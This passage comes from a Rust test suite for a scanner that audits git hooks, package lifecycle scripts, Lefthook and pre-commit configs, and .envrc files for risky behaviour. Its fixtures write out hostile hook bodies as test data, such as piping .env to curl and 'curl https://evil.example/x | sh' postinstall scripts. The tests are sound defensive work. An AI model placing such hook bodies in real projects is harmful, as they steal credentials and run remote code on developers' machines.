        // `.environment` / `NODE_ENV` must NOT fire the .env credential rule.
        assert!(!references_bare_root("setup the .environment now", ".env"));
        assert!(!references_bare_root("echo $NODE_ENVIRONMENT", ".env"));
        // A real `.env` reference (last component, or `.env.local`) MUST fire.
        assert!(references_bare_root("cat .env", ".env"));
        assert!(references_bare_root("source ./.env", ".env"));
        assert!(references_bare_root("cat .env.production", ".env"));
        assert!(references_bare_root("cat ~/.aws/credentials", ".aws"));
        assert!(!references_bare_root("read mydir.sshkeys", ".ssh"));
    }

    #[test]
    fn credential_read_env_fires_on_envrc_style() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat .env | curl -X POST https://x --data-binary @-\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookCredentialRead),
            "reading .env in a hook should fire credential-read: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn network_word_boundary_no_false_positive() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho 'configure securely'\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            !rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "`securely` substring must not fire the network rule"
        );
    }

    #[test]
    fn git_sample_hooks_are_skipped() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // A `.sample` hook is inert until renamed — even one with a network call is ignored.
        write(
            root.path(),
            ".git/hooks/pre-commit.sample",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries.is_empty(),
            "*.sample hooks must not be inventoried: {:?}",
            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn makefile_is_automation_not_hook() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let mk = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Makefile)
            .expect("Makefile should be inventoried");
        assert_eq!(mk.category, HookCategory::Automation);
        let (hooks, automation) = scan.category_counts();
        assert_eq!(hooks, 0, "a Makefile alone yields zero hooks");
        assert_eq!(automation, 1);
    }

    #[test]
    fn mise_is_automation_category() {
        let root = tempdir().unwrap();
        write(root.path(), "mise.toml", "[tools]\nnode = \"20\"\n");
        let scan = scan_for_repo(root.path());
        let m = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Mise)
            .expect("mise.toml should be inventoried");
        assert_eq!(m.category, HookCategory::Automation);
    }

    #[test]
    fn git_commit_targets_pre_commit_not_pre_push() {
        let root = tempdir().unwrap();
        // A clean pre-commit and a network-calling pre-push.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        write(
            root.path(),
            ".husky/pre-push",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // `git commit` must NOT surface the pre-push network finding.
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit.is_empty(),
            "git commit must not surface the pre-push hook's finding: {commit:?}"
        );
        // `git push` MUST surface it.
        let push = scan_triggered_by_leader(root.path(), "git", Some("push"))
            .expect("git push is hook-triggering");
        assert!(
            push.iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git push must surface the pre-push network finding: {push:?}"
        );
    }

    #[test]
    fn every_inventoried_git_event_has_a_command_route() {
        let mut routed = BTreeSet::new();
        for subcommand in [
            "commit",
            "push",
            "pull",
            "merge",
            "rebase",
            "checkout",
            "switch",
            "clone",
            "worktree",
            "am",
            "send-email",
            "add",
            "branch",
            "status",
            "gc",
            "p4",
            "receive-pack",
        ] {
            let target = LeaderTarget::resolve("git", Some(subcommand))
                .expect("documented hook-triggering Git command must resolve");
            routed.extend(target.git_events.iter().copied());
        }

        for event in GIT_EVENTS {
            assert!(
                routed.contains(event),
                "Git event {event:?} is inventoried but cannot be reached by the runtime command matrix"
            );
        }
    }

    #[test]
    fn every_git_event_has_positive_and_negative_target_enforcement() {
        const ROUTES: &[&str] = &[
            "commit",
            "push",
            "pull",
            "merge",
            "rebase",
            "checkout",
            "switch",
            "clone",
            "worktree",
            "am",
            "send-email",
            "add",
            "branch",
            "status",
            "gc",
            "p4",
            "receive-pack",
        ];
        for event in GIT_EVENTS {
            let positive_route = ROUTES
                .iter()
                .find(|route| {
                    LeaderTarget::resolve("git", Some(route))
                        .is_some_and(|target| target.git_events.contains(event))
                })
                .expect("every event must have a positive route");
            let negative_route = ROUTES
                .iter()
                .find(|route| {
                    LeaderTarget::resolve("git", Some(route))
                        .is_some_and(|target| !target.git_events.contains(event))
                })
                .expect("every event must have a negative route");

            let root = tempdir().unwrap();
            mkgit(root.path());
            write(
                root.path(),
                &format!(".git/hooks/{event}"),
                "#!/bin/sh\ncurl https://evil.example/event\n",
            );
            let positive = findings_for_current_tree(
                root.path(),
                &LeaderTarget::resolve("git", Some(positive_route)).unwrap(),
            );
            assert!(positive
                .iter()
                .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
            let negative = findings_for_current_tree(
                root.path(),
                &LeaderTarget::resolve("git", Some(negative_route)).unwrap(),
            );
            assert!(!negative
                .iter()
                .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
        }
    }

    #[test]
    fn receive_pack_target_repository_is_never_scanned_as_the_caller_repo() {
        let findings = scan_triggered_by_command(
            None,
            "git",
            &["receive-pack".to_string(), "../bare.git".to_string()],
        )
        .expect("receive-pack must reach the fail-closed guard");
        assert!(findings.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("server-side")
        }));
    }

    #[test]
    fn mutating_git_remote_operations_route_reference_transactions() {
        for operation in ["add", "remove", "rename", "prune", "update", "set-head"] {
            assert!(is_hook_triggering_command(
                "git",
                &[
                    "remote".to_string(),
                    operation.to_string(),
                    "origin".to_string()
                ]
            ));
        }
        assert!(!is_hook_triggering_command(
            "git",
            &["remote".to_string(), "-v".to_string()]
        ));
    }

    #[test]
    fn incoming_hook_roots_are_always_literal_git_pathspecs() {
        let paths = incoming_surface_pathspecs(&[".hooks[1]*?\\literal".to_string()]);
        assert!(paths.iter().all(|path| path.starts_with(":(literal)")));
        assert!(paths.contains(&":(literal).hooks[1]*?\\literal".to_string()));
    }

    #[test]
    fn trusted_git_uses_global_dash_c_instead_of_child_cwd() {
        let root = Path::new("project path");
        let argv = hardened_git_argv(root, &["status".to_string()], true);
        let dash_c = argv
            .iter()
            .position(|argument| argument == "-C")
            .expect("trusted Git argv must bind repository context with -C");
        assert_eq!(
            argv.get(dash_c + 1).map(OsString::as_os_str),
            Some(root.as_os_str())
        );
        assert!(argv
            .iter()
            .any(|argument| argument.to_string_lossy().starts_with("core.hooksPath=")));
        assert_eq!(
            argv.last().map(OsString::as_os_str),
            Some(std::ffi::OsStr::new("status"))
        );
    }

    #[test]
    fn git_am_and_worktree_add_route_their_exact_lifecycle_events() {
        let am = LeaderTarget::resolve("git", Some("am")).expect("git am must trigger hooks");
        assert!(am.git_events.starts_with(&[
            "applypatch-msg",
            "pre-applypatch",
            "post-applypatch"
        ]));

        assert!(is_hook_triggering_command(
            "git",
            &["am".to_string(), "patch.mbox".to_string()]
        ));
        assert!(is_hook_triggering_command(
            "git",
            &[
                "worktree".to_string(),
                "add".to_string(),
                "../review".to_string(),
                "HEAD".to_string(),
            ]
        ));
        assert!(!is_hook_triggering_command(
            "git",
            &[
                "worktree".to_string(),
                "add".to_string(),
                "--no-checkout".to_string(),
                "../review".to_string(),
            ]
        ));
        assert!(is_hook_triggering_command(
            "git",
            &[
                "worktree".to_string(),
                "add".to_string(),
                "--no-checkout".to_string(),
                "--checkout".to_string(),
                "../review".to_string(),
            ]
        ));
        assert!(!is_hook_triggering_command(
            "git",
            &[
                "worktree".to_string(),
                "add".to_string(),
                "--checkout".to_string(),
                "--no-checkout".to_string(),
                "../review".to_string(),
            ]
        ));
        assert!(is_hook_triggering_command(
            "git",
            &[
                "worktree".to_string(),
                "add".to_string(),
                "--".to_string(),
                "--no-checkout".to_string(),
                "HEAD".to_string(),
            ]
        ));
        assert!(is_hook_triggering_command(
            "git",
            &[
                "clone".to_string(),
                "--no-checkout".to_string(),
                "--checkout".to_string(),
                "repo".to_string(),
            ]
        ));
        assert!(!is_hook_triggering_command(
            "git",
            &[
                "clone".to_string(),
                "--checkout".to_string(),
                "--no-checkout".to_string(),
                "repo".to_string(),
            ]
        ));
        assert!(is_hook_triggering_command(
            "git",
            &[
                "clone".to_string(),
                "--".to_string(),
                "--no-checkout".to_string(),
            ]
        ));
        assert!(!is_hook_triggering_command(
            "git",
            &["worktree".to_string(), "list".to_string()]
        ));

        let root = tempdir().unwrap();
        mkgit(root.path());
        let blocked = scan_triggered_by_command(
            Some(root.path()),
            "git",
            &["am".to_string(), "patch.mbox".to_string()],
        )
        .expect("git am must reach the hook guard");
        assert!(blocked.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("email patch")
        }));
    }

    #[test]
    fn git_repository_and_config_overrides_fail_closed_for_commit_and_push() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        for args in [
            vec!["-C", "../other", "commit"],
            vec!["--git-dir=../other/.git", "commit"],
            vec!["-c", "core.hooksPath=../other-hooks", "push"],
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            let findings = scan_triggered_by_command(Some(root.path()), "git", &args)
                .expect("overridden lifecycle command must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High
                    && finding.detail.contains("override")
            }));
        }
    }

    #[test]
    fn current_local_core_hooks_path_is_inventoried_fresh_on_each_scan() {
        let root = tempdir().unwrap();
        git_ok(root.path(), &["init", "-q"]);
        git_ok(root.path(), &["config", "core.hooksPath", ".githooks"]);
        write(
            root.path(),
            ".githooks/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/custom-hooks\n",
        );

        let findings = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit must scan its effective local hooksPath");
        assert!(findings.iter().any(|finding| {
            finding.rule_id == RuleId::RepoHookNetworkCall && finding.location.contains(".githooks")
        }));

        std::fs::write(
            root.path().join(".githooks/pre-commit"),
            "#!/bin/sh\necho safe\n",
        )
        .unwrap();
        let clean = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("the next lifecycle scan must read the edited custom hook");
        assert!(!clean
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn incoming_hook_roots_use_effective_worktree_config_hooks_path() {
        let root = tempdir().unwrap();
        git_ok(root.path(), &["init", "-q"]);
        git_ok(
            root.path(),
            &["config", "extensions.worktreeConfig", "true"],
        );
        git_ok(
            root.path(),
            &["config", "--worktree", "core.hooksPath", ".worktree-hooks"],
        );
        let roots = tracked_hook_roots(root.path()).expect("effective hooksPath must resolve");
        assert!(roots.contains(&".worktree-hooks".to_string()));

        std::fs::create_dir_all(root.path().join("nested")).unwrap();
        let logical_root = root.path().join("nested/..");
        let logical_roots =
            tracked_hook_roots(&logical_root).expect("normalized repository root must resolve");
        assert!(logical_roots.contains(&".worktree-hooks".to_string()));
    }

    #[test]
    fn external_core_hooks_path_fails_closed_without_disclosing_hook_body() {
        let root = tempdir().unwrap();
        let outside = tempdir().unwrap();
        git_ok(root.path(), &["init", "-q"]);
        let outside_string = outside.path().display().to_string();
        git_ok(root.path(), &["config", "core.hooksPath", &outside_string]);
        std::fs::write(
            outside.path().join("pre-commit"),
            "#!/bin/sh\ncurl https://evil.example/do-not-disclose\n",
        )
        .unwrap();

        let findings = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("external hooksPath must reach the guard");
        assert!(findings.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("outside")
        }));
        assert!(!findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn linked_worktree_uses_common_git_hooks_directory() {
        let container = tempdir().unwrap();
        let main = container.path().join("main");
        let linked = container.path().join("linked");
        std::fs::create_dir_all(&main).unwrap();
        git_ok(&main, &["init", "-q"]);
        git_ok(&main, &["config", "user.email", "test@example.invalid"]);
        git_ok(&main, &["config", "user.name", "Tirith Test"]);
        std::fs::write(main.join("tracked.txt"), "base\n").unwrap();
        git_ok(&main, &["add", "tracked.txt"]);
        git_ok(&main, &["commit", "-q", "-m", "base"]);
        let linked_string = linked.display().to_string();
        git_ok(
            &main,
            &["worktree", "add", "-q", "-b", "linked-test", &linked_string],
        );
        std::fs::write(
            main.join(".git/hooks/pre-commit"),
            "#!/bin/sh\ncurl https://evil.example/common-hooks\n",
        )
        .unwrap();

        let findings = scan_triggered_by_leader(&linked, "git", Some("commit"))
            .expect("linked worktree commit must scan common hooks");
        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn package_manager_install_aliases_route_lifecycle_scripts() {
        for (leader, subcommand) in [
            ("npm", Some("i")),
            ("npm", Some("add")),
            ("npm", Some("isntall")),
            ("npm", Some("clean-install")),
            ("npm", Some("rebuild")),
            ("npm", Some("rb")),
            ("npm", Some("pub")),
            ("yarn", None),
            ("yarn", Some("add")),
            ("yarn", Some("pack")),
            ("yarn", Some("publish")),
            ("pnpm", Some("i")),
            ("pnpm", Some("add")),
            ("pnpm", Some("rebuild")),
            ("pnpm", Some("pack")),
            ("pnpm", Some("publish")),
            ("bun", Some("install")),
            ("bun", Some("publish")),
        ] {
            assert!(
                LeaderTarget::resolve(leader, subcommand)
                    .is_some_and(|target| !target.package_scripts.is_empty()),
                "{leader} {subcommand:?} must route package lifecycle scripts"
            );
        }
    }

    #[test]
    fn package_manager_workdir_overrides_cannot_scan_the_wrong_project() {
        let root = tempdir().unwrap();
        for (leader, args) in [
            ("npm", vec!["--prefix", "../other", "install"]),
            ("yarn", vec!["--cwd=../other", "install"]),
            ("pnpm", vec!["--dir", "../other", "install"]),
            ("pnpm", vec!["-C../other", "i"]),
            ("bun", vec!["install", "--cwd", "../other"]),
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            assert!(is_hook_triggering_command(leader, &args));
            let findings = scan_triggered_by_command(Some(root.path()), leader, &args)
                .expect("lifecycle command with cwd override must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High
                    && finding.detail.contains("working-directory override")
            }));
        }
    }

    #[test]
    fn package_workspace_lifecycle_scope_fails_closed_until_all_manifests_are_bounded() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "package.json",
            r#"{"workspaces":["packages/*"],"scripts":{"prepare":"echo root"}}"#,
        );
        let root_install =
            scan_triggered_by_command(Some(root.path()), "npm", &["install".to_string()])
                .expect("workspace root install must reach the guard");
        assert!(root_install.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("declares workspaces")
        }));

        for (leader, args) in [
            ("npm", vec!["--workspace", "child", "install"]),
            ("pnpm", vec!["--filter", "child", "install"]),
            ("yarn", vec!["workspace", "child", "add", "left-pad"]),
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            assert!(is_hook_triggering_command(leader, &args));
            let findings = scan_triggered_by_command(Some(root.path()), leader, &args)
                .expect("workspace-scoped lifecycle command must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High
                    && finding.detail.contains("workspace")
            }));
        }

        let child = root.path().join("packages/child");
        std::fs::create_dir_all(&child).unwrap();
        write(
            &child,
            "package.json",
            r#"{"scripts":{"prepare":"echo child"}}"#,
        );
        write(
            root.path(),
            "pnpm-workspace.yaml",
            "packages:\n  - packages/*\n",
        );
        let child_install =
            scan_triggered_by_command(Some(&child), "pnpm", &["install".to_string()])
                .expect("workspace child install must reach the guard");
        assert!(child_install.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("workspaces")
        }));
    }

    #[test]
    fn package_publish_and_global_forms_route_or_fail_closed() {
        for (leader, args) in [
            ("yarn", vec!["npm", "publish"]),
            ("pnpm", vec!["publish"]),
            ("bun", vec!["publish"]),
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            assert!(is_hook_triggering_command(leader, &args));
        }
        for (leader, args) in [
            ("npm", vec!["install", "--global"]),
            ("pnpm", vec!["-g", "install"]),
            ("bun", vec!["install", "-g"]),
            ("yarn", vec!["global", "add", "remote-package"]),
            ("yarn", vec!["workspaces", "focus", "child"]),
            ("yarn", vec!["workspaces", "focus", "--all"]),
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            let findings = scan_triggered_by_command(None, leader, &args)
                .expect("global lifecycle command must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.detail.contains("workspace/recursive")
            }));
        }
    }

    #[test]
    fn git_commit_surfaces_network_calling_pre_commit() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/exfil\n",
        );
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git commit must surface a network-calling pre-commit: {commit:?}"
        );
    }

    #[test]
    fn npm_install_targets_package_json_only_not_hooks() {
        let root = tempdir().unwrap();
        // A network-calling pre-commit (git surface) and a clean postinstall.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node ./build.js"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        // The pre-commit network finding must NOT appear — npm install only
        // triggers package.json lifecycle scripts.
        assert!(
            !res.iter().any(|f| f.provider == HookProvider::Husky),
            "npm install must not surface git/husky hooks: {res:?}"
        );
    }

    #[test]
    fn npm_run_does_not_trigger_install_lifecycle() {
        let root = tempdir().unwrap();
        // A malicious postinstall — runs on `npm install`, NOT on `npm run`.
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh","build":"tsc"}}"#,
        );
        // `npm run`/`run-script` are not hook-triggering, so the postinstall must not surface.
        assert!(
            scan_triggered_by_leader(root.path(), "npm", Some("run")).is_none(),
            "`npm run` must not trigger the install-lifecycle hook scan"
        );
        assert!(
            scan_triggered_by_leader(root.path(), "npm", Some("run-script")).is_none(),
            "`npm run-script` must not trigger the install-lifecycle hook scan"
        );
        // `npm install` MUST still surface it.
        let install = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        assert!(
            install
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "npm install must still surface the malicious postinstall: {install:?}"
        );
    }

    #[test]
    fn npm_install_surfaces_malicious_postinstall() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "npm install must surface a malicious postinstall: {res:?}"
        );
    }

    #[test]
    fn npm_lifecycle_routes_only_scripts_the_operation_executes() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"preprepare":"curl https://evil.example/install","prepack":"curl https://evil.example/pack"}}"#,
        );
        let install = scan_triggered_by_leader(root.path(), "npm", Some("clean-install"))
            .expect("npm clean-install alias must trigger lifecycle scanning");
        assert!(install.iter().any(|finding| finding.name == "preprepare"));
        assert!(!install.iter().any(|finding| finding.name == "prepack"));

        let pack = scan_triggered_by_leader(root.path(), "npm", Some("pack"))
            .expect("npm pack must trigger lifecycle scanning");
        assert!(pack.iter().any(|finding| finding.name == "prepack"));
        assert!(!pack.iter().any(|finding| finding.name == "preprepare"));
    }

    #[test]
    fn make_command_is_not_hook_triggering() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        // `make` is not a hook-triggering leader — returns None so the engine
        // skips the whole path. (The Makefile is inventory-only.)
        assert!(scan_triggered_by_leader(root.path(), "make", Some("deploy")).is_none());
    }

    #[test]
    fn direnv_allow_targets_envrc() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "export X=1\ncurl https://evil.example/x\n",
        );
        let res = scan_triggered_by_leader(root.path(), "direnv", Some("allow"))
            .expect("direnv allow is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "direnv allow must surface a network-calling .envrc: {res:?}"
        );
    }

    #[test]
    fn direnv_export_and_current_exec_scan_envrc_but_other_directory_fails_closed() {
        let root = tempdir().unwrap();
        write(root.path(), ".envrc", "curl https://evil.example/direnv\n");
        for args in [vec!["export", "bash"], vec!["exec", ".", "true"]] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            let findings = scan_triggered_by_command(Some(root.path()), "direnv", &args)
                .expect("direnv evaluation must reach the guard");
            assert!(findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
            if args.first().map(String::as_str) == Some("exec") {
                assert!(findings.iter().any(|finding| {
                    finding.rule_id == RuleId::AnalysisIncomplete
                        && finding.severity == Severity::High
                }));
            }
        }

        for args in [
            vec!["exec", "../other", "true"],
            vec!["allow", "../other/.envrc"],
        ] {
            let args: Vec<String> = args.into_iter().map(str::to_string).collect();
            let findings = scan_triggered_by_command(Some(root.path()), "direnv", &args)
                .expect("redirected direnv operation must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High
                    && finding.detail.contains("another path")
            }));
        }

        for tail in ["git commit -m test", "npm install", "sh -c 'npm install'"] {
            let mut args = vec!["exec".to_string(), ".".to_string()];
            args.extend(tail.split_whitespace().map(str::to_string));
            let findings = scan_triggered_by_command(Some(root.path()), "direnv", &args)
                .expect("direnv exec composition must reach the guard");
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High
                    && finding.detail.contains("nested command")
            }));
        }
    }

    #[test]
    fn non_hook_leader_returns_none() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://x\n",
        );
        assert!(scan_triggered_by_leader(root.path(), "ls", None).is_none());
        assert!(scan_triggered_by_leader(root.path(), "git", Some("log")).is_none());
    }

    #[test]
    fn leader_basename_strips_path() {
        assert_eq!(leader_basename("/usr/bin/git"), "git");
        assert_eq!(leader_basename("git"), "git");
        assert_eq!(leader_basename("'git'"), "git");
    }

    #[test]
    fn lefthook_pre_commit_run_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "lefthook.yml",
            "pre-commit:\n  commands:\n    beacon:\n      run: curl https://evil.example\npre-push:\n  commands:\n    ok:\n      run: npm test\n",
        );
        let scan = scan_for_repo(root.path());
        let pc = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-commit")
            .expect("lefthook pre-commit block should be parsed");
        assert!(pc
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
        // The pre-push block (npm test) must be clean.
        let pp = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-push");
        if let Some(pp) = pp {
            assert!(pp.findings.is_empty(), "pre-push block should be clean");
        }
    }

    #[test]
    fn lefthook_yaml_supports_quoted_flow_and_aliased_event_configuration() {
        let yaml = r#"
shared: &shared
  commands:
    beacon: { run: "'curl' https://evil.example/alias" }
'pre-commit': *shared
"pre-push": { commands: { publish: { run: "npm test" } } }
"#;
        let events = lefthook_events(yaml).expect("valid structured Lefthook YAML must parse");
        let pre_commit = events
            .iter()
            .find(|(event, _)| event == "pre-commit")
            .expect("quoted alias event must be inventoried");
        assert!(pre_commit.1.contains("curl"));
        assert!(classify_body(
            &pre_commit.0,
            HookProvider::Lefthook,
            "lefthook.yml",
            &pre_commit.1,
        )
        .iter()
        .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
        assert!(events.iter().any(|(event, _)| event == "pre-push"));
    }

    #[test]
    fn lefthook_root_merge_keys_are_applied_before_event_and_composition_checks() {
        let merged_event = r#"
defaults: &defaults
  pre-commit:
    commands:
      beacon: { run: "curl https://evil.example/merged" }
<<: *defaults
"#;
        let events =
            lefthook_events(merged_event).expect("root merge must materialize the hook event");
        assert!(events
            .iter()
            .any(|(event, body)| event == "pre-commit" && body.contains("curl")));

        let merged_composition = r#"
shared: &shared
  extends: ./shared-hooks.yml
<<: *shared
"#;
        assert!(
            lefthook_events(merged_composition).is_err(),
            "a merge-injected extends directive must fail closed"
        );

        let files_command = r#"
pre-commit:
  files: "curl https://evil.example/file-list"
  commands:
    lint: { run: "echo safe" }
"#;
        let events = lefthook_events(files_command).expect("files command must be represented");
        assert!(events
            .iter()
            .any(|(event, body)| event == "pre-commit" && body.contains("curl")));
    }

    #[test]
    fn lefthook_unsupported_composition_and_invalid_yaml_fail_closed_high() {
        for body in [
            "extends: ./shared-hooks.yml\n",
            "remotes:\n  - git_url: https://evil.example/hooks.git\n",
            "rc: ./lefthook-rc.sh\n",
            "templates:\n  command: 'curl https://evil.example/template'\n",
            "lefthook: pre-push\n",
            "setup: ./setup.sh\n",
            "pre-commit:\n  scripts:\n    danger.sh:\n      runner: bash\n",
            "pre-commit:\n  jobs:\n    - script: danger.sh\n      runner: bash\n",
            "pre-commit: [unterminated\n",
        ] {
            assert!(lefthook_events(body).is_err());
            let root = tempdir().unwrap();
            write(root.path(), "lefthook.yml", body);
            let scan = scan_for_repo(root.path());
            assert!(scan.all_findings().iter().any(|finding| {
                finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
            }));
        }
    }

    #[test]
    fn pre_commit_config_entry_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: beacon\n        entry: curl https://evil.example\n        language: system\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "a curl entry in .pre-commit-config.yaml should fire: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn pre_commit_stages_keep_each_entry_bound_to_its_own_git_event() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: commit-beacon\n        entry: curl https://evil.example/commit\n        language: system\n        stages: [pre-commit]\n      - id: clean-push\n        entry: echo safe\n        language: system\n        stages: [pre-push]\n",
        );
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("commit stage must route");
        assert!(commit
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
        let push = scan_triggered_by_leader(root.path(), "git", Some("push"))
            .expect("push stage must route");
        assert!(!push
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn pre_commit_default_stages_and_legacy_stage_aliases_are_resolved() {
        let parsed = pre_commit_entries(
            "default_stages: [push]\nrepos:\n  - repo: local\n    hooks:\n      - id: inherited\n        entry: curl https://evil.example/push\n        language: system\n      - id: override\n        entry: echo clean\n        language: system\n        stages: [commit]\n",
        )
        .expect("valid stage metadata must parse");
        assert!(parsed
            .iter()
            .any(|(stage, body)| { stage == "pre-push" && body.contains("evil.example/push") }));
        assert!(!parsed
            .iter()
            .any(|(stage, body)| { stage == "pre-commit" && body.contains("evil.example/push") }));
        assert!(parsed
            .iter()
            .any(|(stage, body)| stage == "pre-commit" && body == "echo clean"));
    }

    #[test]
    fn both_pre_commit_configuration_suffixes_are_inventoried() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: clean\n        entry: echo safe\n        language: system\n        stages: [pre-commit]\n",
        );
        write(
            root.path(),
            ".pre-commit-config.yml",
            "repos:\n  - repo: local\n    hooks:\n      - id: beacon\n        entry: curl https://evil.example/second\n        language: system\n        stages: [pre-push]\n",
        );
        let push = scan_triggered_by_leader(root.path(), "git", Some("push"))
            .expect("pre-push stage must route");
        assert!(push
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn incoming_surface_pathspecs_include_pre_commit_configuration() {
        let paths = incoming_surface_pathspecs(&[]);
        assert!(paths.contains(&":(literal).pre-commit-config.yaml".to_string()));
        assert!(paths.contains(&":(literal).pre-commit-config.yml".to_string()));
    }

    #[test]
    fn explain_returns_matching_entries() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let matches = explain_for_repo(root.path(), "pre-commit");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "pre-commit");
        assert!(matches[0].has_high());
    }

    #[test]
